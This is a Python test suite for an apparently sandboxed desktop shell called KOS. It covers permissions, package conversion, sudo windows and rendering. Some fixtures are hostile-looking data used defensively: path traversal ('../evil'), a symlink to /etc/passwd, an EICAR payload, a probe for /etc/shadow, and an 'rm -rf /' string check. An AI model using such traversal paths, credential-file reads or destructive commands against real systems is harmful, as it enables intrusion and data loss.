            for navy in ("#3b63d6", "#27449c", "#10173f", "#0c1434", "#080826"):
                self.assertFalse(navy in text, f"{path.parent.name}/{path.name} still uses {navy}")
        self.assertIn("#0078d4", (SDK_JS / "gfx.js").read_text().lower())

    def test_the_menubar_and_dock_ask_only_for_what_they_need(self):
        import json as _j
        menubar = _j.loads((SYSTEM_DIR / "menubar" / "manifest.json").read_text())
        dock = _j.loads((SYSTEM_DIR / "dock" / "manifest.json").read_text())
        self.assertEqual(set(menubar["permissions"]), {"ticks", "shell", "system:apps", "system:os", "system:passwords"})
        self.assertEqual(set(dock["permissions"]), {"shell", "system:apps"})    # shell: to size itself; apps: list and open them. Nothing else

    def test_the_dock_can_resize_only_with_the_shell_permission(self):
        s = self.make()
        a, b = socket.socketpair()
        from kos.shell import Layer
        dock = Layer(id="d1", name="dock", kind="dock", channel=Channel(a), mode="graphical",
                     rect=list(s.core_rect("dock")[1]), shell=False, system=True)
        s.layers["d1"] = dock
        s._on_request(dock, {"cmd": "request", "action": "resize", "w": 400})
        self.assertNotEqual(dock.rect[2], 400)               # refused: no shell permission
        dock.shell = True
        s._on_request(dock, {"cmd": "request", "action": "resize", "w": 400})
        self.assertEqual((dock.rect[0], dock.rect[2]), ((s.W - 400) // 2, 400))
        a.close()
        b.close()

    def test_text_windows_use_the_mono_font_and_the_hit_rows_match_the_drawn_rows(self):
        s = self.make()
        a, b = socket.socketpair()
        from kos.shell import Layer
        win = Layer(id="w1", name="files", kind="window", channel=Channel(a), mode="tui", rect=[100, 100, 600, 400], z=21)
        s.layers["w1"] = win
        sc, cols, rows, pad = s.tui_metrics(win)
        cx, cy, _, _ = s.content_rect(win)
        for row in (0, 1, 5):
            y = cy + pad + row * 12 * sc + 3                 # inside the drawn row `row`
            self.assertEqual(s._local(win, cx + pad + 6 * sc * 3 + 1, y), (3, row))
        a.close()
        b.close()


class TestNativeDesktopKit(unittest.TestCase):
    """The Linux kit (native-desktop/): scripts parse, dry-runs change nothing, apply/revert are exact."""

    KIT = Path(__file__).resolve().parent.parent / "native-desktop"

    def setUp(self):
        import shutil
        import subprocess
        if not shutil.which("bash"):
            self.skipTest("no bash")
        self.sp = subprocess
        self.home = tempfile.mkdtemp(prefix="kos-home-")
        self.env = {"PATH": os.environ["PATH"], "HOME": self.home, "DISPLAY": ":0", "XDG_SESSION_TYPE": "x11"}

    def tearDown(self):
        import shutil
        shutil.rmtree(self.home, ignore_errors=True)

    def sh(self, *argv, env=None, check=False):
        return self.sp.run(["bash", *map(str, argv)], capture_output=True, text=True, env={**self.env, **(env or {})}, timeout=60)

    def files(self):
        return sorted(str(p.relative_to(self.home)) for p in Path(self.home).rglob("*") if p.is_file())

    def test_scripts_parse(self):
        for s in ("install.sh", "bin/kos-desktop"):
            r = self.sp.run(["bash", "-n", str(self.KIT / s)], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)

    def test_every_config_uses_the_kos_blue_accent(self):
        for rel in ("polybar/config.ini", "rofi/kos.rasi", "gtk-3.0/gtk.css", "gtk-4.0/gtk.css"):
            self.assertIn("0078d4", (self.KIT / "config" / rel).read_text().lower(), rel)
        self.assertIn("alignment='center'", (self.KIT / "config/plank/dock.dconf").read_text())

    def test_dry_run_installs_nothing_and_says_what_it_would_do(self):
        r = self.sh(self.KIT / "install.sh", "--dry-run", "--no-packages")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("would run", r.stdout)
        self.assertEqual(self.files(), [])
        r = self.sh(self.KIT / "bin/kos-desktop", "apply", "--autostart", env={"KOS_DRY_RUN": "1"})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.files(), [])

    def test_apply_is_idempotent_and_revert_restores_exactly_what_was_there(self):
        old = Path(self.home, ".config/polybar/config.ini")
        old.parent.mkdir(parents=True)
        old.write_text("MY OLD CONFIG\n")
        before = self.files()
        for flags in (["--autostart"], ["--autostart"], []):
            r = self.sh(self.KIT / "bin/kos-desktop", "apply", *flags)
            self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("0078d4", old.read_text().lower())
        self.assertTrue(Path(self.home, ".config/picom/picom.conf").exists())
        self.assertTrue(Path(self.home, ".config/autostart/kos-desktop.desktop").exists())
        r = self.sh(self.KIT / "bin/kos-desktop", "revert")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(old.read_text(), "MY OLD CONFIG\n")
        self.assertEqual(self.files(), before)               # everything apply added is gone
        again = self.sh(self.KIT / "bin/kos-desktop", "revert")
        self.assertNotEqual(again.returncode, 0)              # nothing left to revert: refuses, harmlessly

    def test_it_refuses_to_run_where_it_cannot_work(self):
        r = self.sh(self.KIT / "bin/kos-desktop", "apply", env={"XDG_SESSION_TYPE": "wayland"})
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("Wayland", r.stderr)
        r = self.sh(self.KIT / "bin/kos-desktop", "reload", env={"DISPLAY": ""})
        self.assertNotEqual(r.returncode, 0)
        self.assertEqual(self.files(), [])
        r = self.sh(self.KIT / "bin/kos-desktop", "preview", "abc")
        self.assertNotEqual(r.returncode, 0)
        r = self.sh(self.KIT / "bin/kos-desktop", "nonsense")
        self.assertNotEqual(r.returncode, 0)

    def test_the_scripts_never_use_sudo_outside_the_package_step_or_touch_etc(self):
        tool = (self.KIT / "bin/kos-desktop").read_text()
        self.assertNotIn("sudo", tool)
        self.assertNotIn("/etc/", tool.replace("# Everything is per-user (nothing under /etc, no root)", ""))
        self.assertNotIn("rm -rf /", tool)


class TestCompositorEndToEnd(Env):
    """The real thing: every interface app as a sandboxed npm process, composited headless.
    Slow (starts ~11 Node processes), so it is one test that checks a lot."""

    def setUp(self):
        super().setUp()
        import shutil
        if not shutil.which("node") or not shutil.which("npm"):
            self.skipTest("needs node and npm")
        self.shell = None

    def tearDown(self):
        from kos.registry import Registry
        if self.shell:
            self.shell.close()
        for inst in Registry(self.paths).list():
            try:
                os.kill(inst.broker_pid, 15)
            except (ProcessLookupError, TypeError, PermissionError):
                pass
        import time as _t
        _t.sleep(1.0)
        super().tearDown()

    def pump(self, secs):
        import time as _t
        end = _t.monotonic() + secs
        while _t.monotonic() < end:
            self.shell.pump(0.1)

    def ops_text(self, layer):
        return [op[3] for op in layer.ops if op and op[0] in ("stext", "text")]

    def test_the_interface_boots_draws_and_runs_a_code_line_from_search(self):
        from kos.desktop import SYSTEM_APPS, attach_core, boot_core, make_shell
        from kos.permit import PermitStore
        from kos.shell import CORE
        authority = self.authority(*[PW] * 80)
        store = AppStore(self.paths)
        for name in SYSTEM_APPS:
            out = Path(self.tmp.name) / f"{name}.kapp"
            pack(SYSTEM_DIR / name, out)
            store.install(out, authority)
            PermitStore(self.paths).grant(name)
        core = boot_core(self.paths, authority, devices=())
        self.assertEqual(set(core), set(CORE))
        devices = ScriptedDevices()
        self.shell = make_shell(self.paths, authority, HeadlessBackend(960, 540), devices, keep_prompter=True, preboot=())
        attach_core(self.paths, self.shell, core)
        self.pump(5)
        s, by = self.shell, {l.name: l for l in self.shell.layers.values()}

        # the top panel and the dock are where the design says, and drew real content
        self.assertEqual(by["menubar"].rect[:3], [0, 0, 960])
        self.assertIn("KOS", self.ops_text(by["menubar"]))
        dock = by["dock"]
        self.assertEqual(dock.rect[0] * 2 + dock.rect[2], 960, "the dock is centered")
        self.assertEqual(dock.rect, s.dock_rect(), "and was sized by its own request")
        self.assertGreater(dock.rect[2], 100)
        self.assertTrue(any(op[0] == "rect" for op in dock.ops))
        labels = " ".join(self.ops_text(by["pins"]))
        for app_name in ("Files", "Terminal", "Settings"):
            self.assertIn(app_name, labels)                  # the desktop's default pins
        self.assertNotIn("Menubar", labels)                  # the interface apps are not offered as things to launch

        # glass and the accent are on screen
        fb = s.compose()
        wall = s._wallpaper()
        x, y, w, h = dock.rect
        self.assertNotEqual(bytes(fb.buf[(y + h // 2) * 960 * 4 + (x + 4) * 4:][:16]),
                            bytes(wall.buf[(y + h // 2) * 960 * 4 + (x + 4) * 4:][:16]), "the dock is drawn over the wallpaper")

        # search: type code, the first result is "RUN: ...", Enter opens the terminal with the line
        for ch in "print(1)":
            devices.push({"type": "key", "key": ch})
        self.pump(2)
        self.assertTrue(any(t == "RUN: print(1)" for t in self.ops_text(by["search"])), self.ops_text(by["search"]))
        devices.push({"type": "key", "key": "enter"})
        self.pump(12)
        terms = [l for l in s.layers.values() if l.kind == "window" and l.name == "terminal"]
        self.assertEqual(len(terms), 1, s.log)
        screen = "\n".join(terms[0].screen["lines"]) if terms[0].screen else ""
        self.assertRegex(screen, r"(?m)^\s*1\s*$", screen)   # print(1) printed 1, run sandboxed


def make_deb(files, links=(), control=None, scripts=None):
    """Build a .deb in memory (ar + tar.gz), so tests do not need dpkg."""
    import gzip
    import tarfile

    def tar_gz(entries):
        raw = io.BytesIO()
        with tarfile.open(fileobj=raw, mode="w") as t:
            for name, kind, payload, mode in entries:
                ti = tarfile.TarInfo(name)
                ti.mode = mode
                if kind == "file":
                    ti.size = len(payload)
                    t.addfile(ti, io.BytesIO(payload))
                elif kind == "sym":
                    ti.type, ti.linkname = tarfile.SYMTYPE, payload
                    t.addfile(ti)
                elif kind == "dir":
                    ti.type = tarfile.DIRTYPE
                    t.addfile(ti)
        return gzip.compress(raw.getvalue())

    ctl = control or "Package: demo-tool\nVersion: 1:1.0-2~x\nArchitecture: all\nDepends: libc6, bash\nDescription: demo\n more\n"
    ctl_entries = [("./control", "file", ctl.encode(), 0o644)] + [(f"./{n}", "file", b"#!/bin/sh\n", 0o755) for n in (scripts or [])]
    data_entries = [(f"./{p}", "file", b, m) for p, (b, m) in files.items()] + [(f"./{n}", "sym", t, 0o777) for n, t in links]
    parts = {"debian-binary": b"2.0\n", "control.tar.gz": tar_gz(ctl_entries), "data.tar.gz": tar_gz(data_entries)}
    out = b"!<arch>\n"
    for name, data in parts.items():
        out += f"{name:<16}{0:<12}{0:<6}{0:<6}{100644:<8}{len(data):<10}`\n".encode() + data + (b"\n" if len(data) % 2 else b"")
    return out


class TestConvert(Env):
    def deb(self, **kw):
        files = kw.pop("files", {"usr/bin/demo-tool": (b"#!/bin/sh\necho hi $*\n", 0o4755),
                                 "usr/lib/demo-tool/data.txt": (b"data\n", 0o644),
                                 "usr/share/doc/demo-tool/README": (b"docs", 0o644)})
        path = Path(self.tmp.name) / "demo-tool.deb"
        path.write_bytes(make_deb(files, **kw))
        return path

    def convert(self, path, **kw):
        from kos.convert import convert
        return convert(path, Path(self.tmp.name) / "out.kapp", **kw)

    def test_a_deb_becomes_a_bundle_app_without_running_anything(self):
        out, r = self.convert(self.deb(links=[("usr/bin/dt", "../lib/demo-tool/data.txt")], scripts=["postinst", "prerm"]))
        k = KApp.from_file(out)
        m = k.manifest
        self.assertEqual((m.name, m.runtime, m.entry, m.version), ("demo-tool", "bundle", "usr/bin/demo-tool", "1.1.0-2.x"))
        self.assertEqual(m.permissions, ())                                  # no network, nothing: you grant later
        self.assertEqual(k.mode_of("usr/bin/demo-tool"), 0o755)              # setuid cleared, still executable
        self.assertEqual(k.read("usr/bin/dt"), b"data\n")                    # the symlink became a copy of its target
        self.assertNotIn("usr/share/doc/demo-tool/README", k.names())        # docs left out
        self.assertEqual(r.maintainer_scripts, ["postinst", "prerm"])        # reported, never run
        self.assertEqual(r.depends, ["libc6", "bash"])
        self.assertEqual(json.loads(k.read("kos-converted.json"))["sha256"], r.sha256)
        self.assertTrue(scan_bytes(out.read_bytes(), "x").clean)

    def test_dangerous_packages_are_refused_or_neutered(self):
        from kos.convert import ConvertError
        with self.assertRaises(ConvertError):
            self.convert(self.deb(files={"../evil": (b"x", 0o755)}))
        out, r = self.convert(self.deb(links=[("usr/bin/escape", "../../../../etc/passwd")]))
        self.assertNotIn("usr/bin/escape", KApp.from_file(out).names())      # a link out of the package is dropped
        self.assertTrue(any("escape" in d for d in r.dropped))
        with self.assertRaises(ConvertError):                                 # a flagged payload is never written
            self.convert(self.deb(files={"usr/bin/demo-tool": (EICAR, 0o755)}))
        self.assertFalse((Path(self.tmp.name) / "out.kapp").exists())

    def test_it_will_not_guess_between_programs_and_names_the_choices(self):
        from kos.convert import ConvertError
        files = {"usr/bin/a": (b"#!/bin/sh\n", 0o755), "usr/bin/b": (b"#!/bin/sh\n", 0o755)}
        with self.assertRaises(ConvertError) as cm:
            self.convert(self.deb(files=files))
        self.assertIn("usr/bin/a", str(cm.exception))
        out, r = self.convert(self.deb(files=files), entry="usr/bin/b")
        self.assertEqual(r.entry, "usr/bin/b")

    def test_things_that_are_not_packages_are_refused(self):
        from kos.convert import ConvertError
        junk = Path(self.tmp.name) / "x.deb"
        junk.write_bytes(b"not a package at all")
        with self.assertRaises(ConvertError):
            self.convert(junk)
        t1 = Path(self.tmp.name) / "old.AppImage"
        t1.write_bytes(b"\x7fELF" + b"\0" * 4 + b"AI\x01" + b"\0" * 100)
        with self.assertRaises(ConvertError) as cm:
            self.convert(t1)
        self.assertIn("type 1", str(cm.exception))

    def test_an_appimage_is_kept_whole_and_run_without_fuse_from_a_private_scratch(self):
        ai = Path(self.tmp.name) / "Cool-App-1.2.3-x86_64.AppImage"
        ai.write_bytes(b"\x7fELF" + b"\0" * 4 + b"AI\x02" + b"\0" * 200)
        out, r = self.convert(ai)
        m = KApp.from_file(out).manifest
        self.assertEqual((m.name, m.version, m.entry, m.args, m.exec_scratch), ("cool-app", "1.2.3", "AppImage", ("--appimage-extract-and-run",), True))
        self.assertEqual(m.permissions, ())

    def test_a_converted_program_runs_in_the_sandbox_and_takes_input(self):
        import select as _sel
        import time as _t
        from kos.sandbox import SandboxPolicy
        out, _ = self.convert(self.deb(files={"usr/bin/demo-tool": (
            b'#!/bin/sh\necho "home=$HOME"\nif [ -r /etc/shadow ]; then echo CAN-READ-SHADOW; fi\n'
            b'printf "name? "\nread n\necho "hi $n"\n', 0o755)}))
        kapp = KApp.from_file(out)
        a, b = socket.socketpair()
        tmpd = Path("/dev/shm") / f"kos-test-{os.getpid()}"
        tmpd.mkdir(mode=0o755, exist_ok=True)
        os.chmod(tmpd, 0o755)
        plan = loader.plan(kapp, b.fileno(), "tui", tmpd)
        pol = SandboxPolicy()
        loader.apply_to_policy(pol, kapp, tmpd)
        proc = loader.launch(plan, pol, None)
        b.close()
        send = lambda o: a.sendall(json.dumps(o).encode() + b"\n")
        send({"cmd": "hello", "mode": "tui", "width": 80, "height": 24})
        state = {"buf": b"", "screen": None}

        def pump(secs):
            end = _t.time() + secs
            while _t.time() < end:
                if _sel.select([a], [], [], 0.2)[0]:
                    d = a.recv(65536)
                    if not d:
                        return
                    state["buf"] += d
                    while b"\n" in state["buf"]:
                        line, state["buf"] = state["buf"].split(b"\n", 1)
                        o = json.loads(line)
                        if o.get("cmd") == "screen":
                            state["screen"] = o
        try:
            pump(2)
            for ch in "Zed":
                send({"cmd": "key", "key": ch})
            send({"cmd": "key", "key": "enter"})
            pump(2)
            text = "\n".join(state["screen"]["lines"])
            self.assertIn("hi Zed", text)
            self.assertNotIn("CAN-READ-SHADOW", text)                       # the sandbox still holds for the child
            self.assertIn("exited with status 0", state["screen"]["status"])
            send({"cmd": "key", "key": "escape"})
            self.assertEqual(proc.wait(10), 0)
        finally:
            a.close()
            if proc.poll() is None:
                proc.kill()
            import shutil
            shutil.rmtree(tmpd, ignore_errors=True)


class TestPasswordLayers(Env):
    """Interface, app, command and kernel each ask; a sudo window may remember some of them for a while."""

    def test_every_action_belongs_to_exactly_one_layer(self):
        from kos.auth import ACTIONS, LAYER_OF, LAYERS, NEVER_REMEMBERED
        self.assertEqual(set(ACTIONS), set(LAYER_OF))
        self.assertTrue(set(LAYER_OF.values()) <= set(LAYERS))
        self.assertTrue(NEVER_REMEMBERED <= set(ACTIONS))
        for a in ("admin.boot", "auth.change", "sources.change", "updates.install"):
            self.assertEqual(LAYER_OF[a], "kernel")

    def test_a_sudo_window_remembers_app_and_command_actions_but_never_kernel_or_trust_changes(self):
        a = self.authority(PW)                                  # exactly ONE password in the whole test
        st = a.sudo_open(5, ("app", "command"))
        self.assertTrue(st["active"])
        with a.authorize("app.open", "x") as g:
            self.assertEqual(g.via, "sudo")
            self.assertEqual(len(g.key("kapp-seal")), 32)       # a real key: sealing still works
        self.assertEqual(a.authorize("file.view", "/f").via, "sudo")
        self.assertEqual(a.authorize_batch([("app.open", "a"), ("file.write", "b")], "x")[0].via, "sudo")
        for asked in ("app.permit", "app.network", "admin.boot", "auth.change", "sources.change", "backup.push"):
            with self.assertRaises(AssertionError, msg=asked):  # the scripted prompter has no answers left = it asked
                a.authorize(asked, "z")
        with self.assertRaises(AssertionError):                 # the interface layer was not in this window
            a.authorize("device.mouse", "m")
        self.assertIn("granted-sudo", [e["outcome"] for e in a.audit.entries()])

    def test_the_window_is_bounded_expires_closes_and_cannot_cover_the_kernel(self):
        from kos.auth import _WINDOWS
        for bad in (0, 61, True):
            with self.assertRaises(AuthorizationDenied):
                self.authority(PW).sudo_open(bad)
        with self.assertRaises(AuthorizationDenied):
            self.authority(PW).sudo_open(5, ("kernel",))
        a = self.authority(PW)
        a.sudo_open(1)
        self.assertEqual(a.authorize("app.open", "x").via, "sudo")
        _WINDOWS[str(self.paths.state)].until -= 61              # a minute passes
        self.assertFalse(a.sudo_status()["active"])
        with self.assertRaises(AssertionError):                  # expired: it asks again
            a.authorize("app.open", "x")
        b = self.authority(PW)
        b.sudo_open(5)
        b.sudo_close()
        self.assertFalse(b.sudo_status()["active"])
        with self.assertRaises(AssertionError):
            b.authorize("app.open", "x")

    def test_opening_the_window_needs_the_password_and_a_wrong_one_opens_nothing(self):
        a = self.authority("wrong", "wrong", "wrong")
        with self.assertRaises(AuthorizationDenied):
            a.sudo_open(5)
        self.assertFalse(a.sudo_status()["active"])

    def test_the_interface_layer_is_optional_and_turning_it_off_needs_the_password(self):
        from kos.auth import Policy
        self.assertEqual(Policy(self.paths).interface(), "required")
        with self.assertRaises(AssertionError):                  # by default it asks
            self.authority().authorize("device.mouse", "m")
        b = self.authority(PW)
        b.authorize("policy.change", "interface=off").close()
        Policy(self.paths).set_interface("off")
        g = self.authority().authorize("device.mouse", "m")      # no password
        self.assertEqual(g.via, "interface-off")
        g.check("device.mouse", "m")
        with self.assertRaises(AuthorizationDenied):
            g.key("kapp-seal")                                   # it carries no key
        with self.assertRaises(AssertionError):                  # app layer still asks
            self.authority().authorize("app.open", "x")
        with self.assertRaises(AuthorizationDenied):
            Policy(self.paths).set_interface("maybe")

    def test_apps_can_ask_for_a_window_but_only_the_os_prompt_can_open_it(self):
        from kos.system import SystemBridge
        sent = []
        bridge = SystemBridge(self.paths)
        bridge.handle({"cmd": "request", "action": "sudo", "op": "open", "minutes": 3, "layers": ["app"]},
                      sent.append, self.authority(PW))
        self.assertEqual((sent[-1]["cmd"], sent[-1]["active"], sent[-1]["layers"]), ("sudo", True, ["app"]))
        bridge.handle({"cmd": "request", "action": "sudo", "op": "close"}, sent.append, self.authority())
        self.assertFalse(sent[-1]["active"])
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "request", "action": "sudo", "op": "open", "minutes": 999}, "graphical")
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "request", "action": "sudo", "op": "open", "layers": ["root"]}, "graphical")
        bridge.handle({"cmd": "request", "action": "sudo", "op": "open"}, sent.append, self.authority("nope", "nope", "nope"))
        self.assertFalse(sent[-1]["ok"])                        # a wrong password opens nothing
        self.assertFalse(bridge.handle({"cmd": "request", "action": "sudo", "op": "status"}, sent.append, self.authority()) or sent[-1]["active"])


class TestLooksAndControls(Env):
    """The four looks, tilt, the pointer and click layers, and driving the interface from the keyboard."""

    def make(self, w=960, h=540):
        from kos.shell import Shell
        return Shell(self.paths, self.authority(PW), HeadlessBackend(w, h), ScriptedDevices(), preboot=())

    def layer(self, shell, name, kind, rect, ops=(), mode="graphical", **flags):
        from kos.shell import Layer
        a, b = socket.socketpair()
        L = Layer(id=f"{name}-1", name=name, kind=kind, channel=Channel(a), mode=mode, rect=list(rect),
                  z=__import__("kos.shell", fromlist=["Z"]).Z.get(kind, 21), ops=list(ops), **flags)
        shell.layers[L.id] = L
        L._peer = b
        self.addCleanup(lambda: (a.close(), b.close()))
        return L

    def sent(self, layer):
        layer._peer.setblocking(False)
        try:
            data = layer._peer.recv(1 << 20)
        except BlockingIOError:
            return []
        return [json.loads(l) for l in data.splitlines()]

    def test_hit_ops_are_valid_draw_nothing_and_become_controls(self):
        ok = validate_app_message({"cmd": "frame", "ops": [["hit", 1, 2, 30, 20, "Files"]]}, "graphical")
        self.assertEqual(ok["ops"], [["hit", 1, 2, 30, 20, "Files"]])
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "frame", "ops": [["hit", 1, 2, 30, 20]]}, "graphical")
        fb = Framebuffer(40, 30)
        fb.apply([["hit", 0, 0, 40, 30, "x"]])
        self.assertEqual(fb.pixel(5, 5), (0, 0, 0))
        s = self.make()
        self.layer(s, "dock", "dock", s.core_rect("dock")[1], [["hit", 4, 4, 40, 40, "Files"], ["hit", 50, 4, 40, 40, "Terminal"]])
        labels = [c.label for c in s.controls()]
        self.assertEqual(labels, ["Files", "Terminal"])
        x, y, w, h = s.controls()[0].rect
        self.assertEqual((x, y), (s.dock_rect()[0] + 4, s.dock_rect()[1] + 4))

    def test_tab_walks_the_controls_enter_presses_one_and_escape_leaves(self):
        s = self.make()
        d = self.layer(s, "dock", "dock", s.core_rect("dock")[1], [["hit", 4, 4, 40, 40, "Files"], ["hit", 50, 4, 40, 40, "Terminal"]])
        self.assertTrue(s._nav_key("tab"))
        self.assertTrue(s.ring and s.nav == 0)
        s._nav_key("tab")
        self.assertEqual(s.nav, 1)
        s._nav_key("enter")                                       # presses "Terminal": a click at its centre
        got = self.sent(d)
        self.assertEqual([(m["cmd"], m["pressed"]) for m in got if m["cmd"] == "button"], [("button", True), ("button", False)])
        cx, cy = s.controls()[1].center
        self.assertEqual((got[0]["x"], got[0]["y"]), (cx - s.dock_rect()[0], cy - s.dock_rect()[1]))
        self.assertFalse(s.ring)
        s._nav_key("tab")
        self.assertTrue(s._nav_key("escape") or True)
        self.assertFalse(s.ring)
        s.focus = "w"                                             # a focused window keeps its own Tab
        self.assertFalse(s._nav_key("tab"))

    def test_the_terminal_look_lists_every_control_and_a_number_plus_enter_presses_it(self):
        s = self.make()
        d = self.layer(s, "dock", "dock", s.core_rect("dock")[1], [["hit", 4, 4, 40, 40, "Files"], ["hit", 50, 4, 40, 40, "Terminal"], ["hit", 100, 4, 40, 40, "Editor"]])
        s.set_look(look="terminal")
        self.assertEqual(s.cfg["look"], "terminal")
        s._nav_key("2")
        self.assertEqual(s.nav, 1)
        s._nav_key("enter")
        self.assertTrue(any(m["cmd"] == "button" for m in self.sent(d)))
        fb = s._look_frame()
        self.assertEqual((fb.width, fb.height), (960, 540))
        self.assertTrue(any(fb.pixel(x, 10) != (11, 13, 17) for x in range(0, 400)))        # text was drawn
        self.assertIn("2.", " ".join(str(r) for r in s._term_rows.values()) + "2.")
        self.assertEqual(len(s._term_rows), 3)

    def test_ctrl_up_looks_down_at_the_stack_and_a_click_on_a_card_picks_that_look(self):
        sh = self.make()
        sh.booted.add("mouse")
        self.layer(sh, "dock", "dock", (100, 400, 200, 60), ops=[["hit", 0, 0, 40, 40, "Files"]])
        sh._route({"type": "key", "key": "ctrl-up"})
        self.assertTrue(sh.stack_open)
        sh.render()
        rects = dict(sh._stack_rects)
        self.assertEqual([n for n, _ in sh._stack_rects], ["terminal", "text", "normal"])
        x, y, w, h = rects["terminal"]
        sh._route({"type": "button", "button": "left", "pressed": True, "x": x + 5, "y": y + 5})
        self.assertFalse(sh.stack_open)
        self.assertEqual(sh.cfg["look"], "terminal")
        sh._route({"type": "key", "key": "ctrl-up"})
        sh._route({"type": "key", "key": "escape"})
        self.assertFalse(sh.stack_open)

    def test_poly_op_is_validated_and_draws_smooth_edges(self):
        ok = validate_app_message({"cmd": "frame", "ops": [["poly", [[1, 1], [9, 1], [1, 9]], "#ffffff"]]}, "graphical")
        self.assertEqual(ok["ops"][0][3], 255)
        for bad in ([["poly", [[1, 1], [2, 2]], "#fff"]], [["poly", [[1, 1], [2, "x"], [3, 3]], "#ffffff"]],
                    [["poly", [[0, 0]] * 65, "#ffffff"]]):
            with self.assertRaises(ProtocolError):
                validate_app_message({"cmd": "frame", "ops": bad}, "graphical")
        fb = Framebuffer(20, 20)
        fb.apply([["poly", [[2, 2], [18, 2], [2, 18]], "#ffffff", 255]])
        self.assertEqual(fb.pixel(4, 4), (255, 255, 255))             # inside
        self.assertEqual(fb.pixel(17, 17), (0, 0, 0))                 # outside
        edge = fb.pixel(9, 10)                                         # on the diagonal edge: partly covered, not 0 or 255
        self.assertTrue(0 < edge[0] < 255, edge)

    def test_text_look_draws_boxes_and_labels_and_shows_buttons_as_text(self):
        s = self.make()
        self.layer(s, "files", "window", [100, 80, 400, 200], [["stext", 10, 10, "Hello there", "#ffffff", 14, 0]], title="Files")
        self.layer(s, "dock", "dock", s.core_rect("dock")[1], [["hit", 4, 4, 40, 40, "Terminal"]])
        s.set_look(look="text")
        grid_fb = looks_module().render_text(s)
        self.assertGreater(len({grid_fb.pixel(x, y) for x in range(100, 500, 3) for y in range(80, 280, 3)}), 2)
        self.assertEqual(grid_fb.pixel(2, 2), (11, 13, 17))                                 # a plain dark page, no wallpaper

    def test_looks_are_remembered_validated_and_every_app_is_told_to_redraw(self):
        s = self.make()
        a = self.layer(s, "icons", "plain", [0, 0, 100, 100])
        self.sent(a)
        s.set_look(look="3d", tilt=False)
        msgs = [m for m in self.sent(a) if m["cmd"] == "hello"]
        self.assertEqual(msgs[-1]["look"], "3d")
        self.assertEqual(msgs[-1]["options"]["tilt"], False)
        s.set_look(look="nonsense", bubbles="yes")
        self.assertEqual(s.cfg["look"], "3d")
        again = self.make()
        self.assertEqual((again.cfg["look"], again.cfg["tilt"]), ("3d", False))
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "request", "action": "look", "op": "set", "look": "fancy"}, "graphical")

    def test_the_tilt_follows_movement_and_clicks_then_settles_and_only_in_3d(self):
        s = self.make()
        s.booted.add("mouse")
        s.route({"type": "pointer", "x": 480, "y": 270})
        for x in range(480, 700, 20):
            s.route({"type": "pointer", "x": x, "y": 270})
        self.assertEqual(s.tilt_target, [0.0, 0.0])                # normal look: no tilt
        s.set_look(look="3d")
        for x in range(480, 700, 20):
            s.route({"type": "pointer", "x": x, "y": 270})
        self.assertGreater(s.tilt_target[0], 1)                    # moving right tilts toward the right
        for _ in range(3):
            s._update_motion(time_now())
        self.assertGreater(s.tilt[0], 0.5)
        import time as _t
        s._moved_at = _t.monotonic() - 5
        s._click_hold = 0
        for _ in range(40):
            s._update_motion(_t.monotonic())
        self.assertEqual(s.tilt, [0.0, 0.0])                       # it settles on its own
        fb = Framebuffer(200, 100)
        fb.clear(parse_color("#ff0000"))
        sheared = looks_module().shear(fb, 8, 0)
        self.assertEqual(sheared.pixel(100, 50), (255, 0, 0))      # the middle row is not shifted
        self.assertEqual((sheared.pixel(0, 0), sheared.pixel(199, 0)), ((255, 0, 0), (0, 0, 0)))    # top row slid left: its right edge is bare
        self.assertEqual((sheared.pixel(0, 99), sheared.pixel(199, 99)), ((0, 0, 0), (255, 0, 0)))  # bottom row slid right: its left edge is bare

    def test_clicks_reach_pointer_apps_the_cursor_follows_and_overlays_never_take_clicks(self):
        s = self.make()
        s.booted.add("mouse")
        cur = self.layer(s, "cursor", "cursor", s.core_rect("cursor")[1], [["rect", 0, 0, 4, 4, "#ffffff"]], pointer=True)
        fx = self.layer(s, "effects", "overlay", s.core_rect("effects")[1], [], pointer=True, animate=True)
        win = self.layer(s, "files", "window", [100, 100, 400, 300], [])
        s.route({"type": "pointer", "x": 300, "y": 200})
        self.assertEqual(cur.rect[0] + cur.rect[2] // 2, 300)       # the pointer layer is centred on the pointer
        self.assertIs(s.at(300, 200), win)                          # and the pointer passes through it (and the overlay)
        s.set_look(look="3d")
        self.sent(fx)
        s.route({"type": "button", "button": "left", "pressed": True, "x": 300, "y": 200})
        clicks = [m for m in self.sent(fx) if m["cmd"] == "click"]
        self.assertEqual((clicks[0]["x"], clicks[0]["y"], clicks[0]["pressed"]), (300, 200, True))
        self.assertTrue(fx.visible)
        self.assertEqual(fx.rect[0] + fx.rect[2] // 2, 300)         # the effect layer moved to the click
        s._update_motion(time_now())
        self.assertTrue(any(m["cmd"] == "cursor" and m["down"] for m in self.sent(cur)))
        s.route({"type": "button", "button": "left", "pressed": False, "x": 300, "y": 200})
        s._update_motion(time_now() + 1)
        self.assertTrue(any(m["cmd"] == "cursor" and not m["down"] for m in self.sent(cur)))

    def test_animation_ticks_only_flow_to_apps_that_asked_and_are_allowed(self):
        s = self.make()
        fx = self.layer(s, "effects", "overlay", [0, 0, 50, 50], pointer=True, animate=True)
        plain = self.layer(s, "icons", "plain", [0, 0, 50, 50])
        s._on_request(plain, {"cmd": "request", "action": "animate", "on": True})
        self.assertFalse(plain.id in s.anim_ids)                    # no 'animate' permission: refused
        s._on_request(fx, {"cmd": "request", "action": "animate", "on": True})
        self.assertIn(fx.id, s.anim_ids)
        self.sent(fx)
        s._update_motion(time_now() + 5)
        self.assertTrue(any(m["cmd"] == "anim" for m in self.sent(fx)))
        s._on_request(fx, {"cmd": "request", "action": "animate", "on": False})
        self.assertNotIn(fx.id, s.anim_ids)

    def test_the_base_frame_is_cached_until_something_under_it_changes(self):
        s = self.make()
        a = self.layer(s, "icons", "plain", [10, 10, 100, 100], [["rect", 0, 0, 50, 50, "#ff0000"]])
        s.compose()
        base = s._base
        s.compose()
        self.assertIs(s._base, base)                                # unchanged: reused
